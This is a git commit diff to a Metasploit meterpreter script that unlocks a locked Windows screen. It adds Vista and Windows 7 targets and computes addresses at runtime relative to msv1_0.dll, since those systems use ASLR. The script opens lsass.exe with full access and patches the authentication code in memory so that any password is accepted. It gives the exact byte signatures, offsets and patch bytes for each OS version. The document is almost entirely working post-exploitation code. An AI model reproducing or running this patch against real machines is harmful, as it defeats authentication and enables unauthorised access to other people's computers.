fc731293b6d3ce5af170cdfd5a13d549d6b03a09
Sven T <relentlesscoding@gmail.com>
2010-02-21 02:58:06 +0100

    Add Windows Vista and 7 targets to screen_unlock meterpreter script
    As Vista and 7 use ASLR, the target section now contains relative
    offsets to the base of msv1_0.dll. The full address is calculated
    during runtime.

--- metasploit/screen_unlock.rb
+++ metasploit/screen_unlock.rb
@@ -1,5 +1,5 @@
 #
-# Script to unlock a windows screen.
+# Script to unlock a windows screen by L4teral <l4teral [4t] gmail com>
 # Needs system prvileges to run and known signatures for the target system.
 # This script patches msv1_0.dll loaded by lsass.exe
 #
@@ -8,8 +8,12 @@
 
 revert = false
 targets = [
-	{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x77c79927, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x77c799cc, :os => /Windows XP.*Service Pack 2/ },
-	{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x77c7981b, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x77c798c0, :os => /Windows XP.*Service Pack 3/ }
+	{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x9927, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x99cc, :os => /Windows XP.*Service Pack 2/ },
+	{ :sig => "8bff558bec83ec50a1", :sigoffset => 0x981b, :orig_code => "32c0", :patch => "b001", :patchoffset => 0x98c0, :os => /Windows XP.*Service Pack 3/ },
+	{ :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xb76a, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xb827, :os => /Windows Vista/ },
+	{ :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xb391, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xb44e, :os => /Windows Vista/ },
+	{ :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xacf6, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xadb3, :os => /Windows Vista/ },
+	{ :sig => "8bff558bec81ec88000000a1", :sigoffset => 0xe881, :orig_code => "32c0", :patch => "b001", :patchoffset => 0xe93e, :os => /Windows 7/ }
 ]
 
 opts = Rex::Parser::Arguments.new(
@@ -29,40 +33,40 @@ opts.parse(args) { |opt, idx, val|
 }
 
 os = client.sys.config.sysinfo['OS']
-target = nil
 
 targets.each do |t|
-	target = t if os =~ t[:os]
-end
-if target
-	print_status("OS '#{os}' found in known targets")
-else
-	print_error("OS '#{os}' not found in known targets")
-	raise Rex::Script::Completed
+	if os =~ t[:os]
+		target = t 
+		print_status("OS '#{os}' found in known targets")
+		pid = client.sys.process["lsass.exe"]
+		p = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+		dllbase = p.image["msv1_0.dll"]
+
+		sig = p.memory.read(dllbase + target[:sigoffset], target[:sig].length / 2).unpack("H*")[0]
+		if sig != target[:sig]
+			print_error("found signature does not match")
+			next
+		end
+		old_code = p.memory.read(dllbase + target[:patchoffset], target[:orig_code].length / 2).unpack("H*")[0]
+		if !((old_code == target[:orig_code] && !revert) || (old_code == target[:patch] && revert))
+			print_error("found code does not match")
+			next
+		end
+
+		print_status("patching...")
+		new_code = revert ? target[:orig_code] : target[:patch]
+		p.memory.write(dllbase + target[:patchoffset], [new_code].pack("H*"))
+
+		written_code = p.memory.read(dllbase + target[:patchoffset], target[:patch].length / 2).unpack("H*")[0]
+		if ((written_code == target[:patch] && !revert) || (written_code == target[:orig_code] && revert))
+			print_status("done!")
+			raise Rex::Script::Completed
+		else
+			print_error("failed!")
+			next
+		end
+	end
 end
 
-pid = client.sys.process["lsass.exe"]
-p = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
-
-sig = p.memory.read(target[:sigoffset], target[:sig].length / 2).unpack("H*")[0]
-if sig != target[:sig]
-	print_error("found signature does not match")
-	raise Rex::Script::Completed
-end
-old_code = p.memory.read(target[:patchoffset], target[:orig_code].length / 2).unpack("H*")[0]
-if !((old_code == target[:orig_code] && !revert) || (old_code == target[:patch] && revert))
-	print_error("found code does not match")
-	raise Rex::Script::Completed
-end
-
-print_status("patching...")
-new_code = revert ? target[:orig_code] : target[:patch]
-p.memory.write(target[:patchoffset], [new_code].pack("H*"))
-
-written_code = p.memory.read(target[:patchoffset], target[:patch].length / 2).unpack("H*")[0]
-if ((written_code == target[:patch] && !revert) || (written_code == target[:orig_code] && revert))
-	print_status("done!")
-else
-	print_error("failed!")
-end
+print_status("no working target found")
 
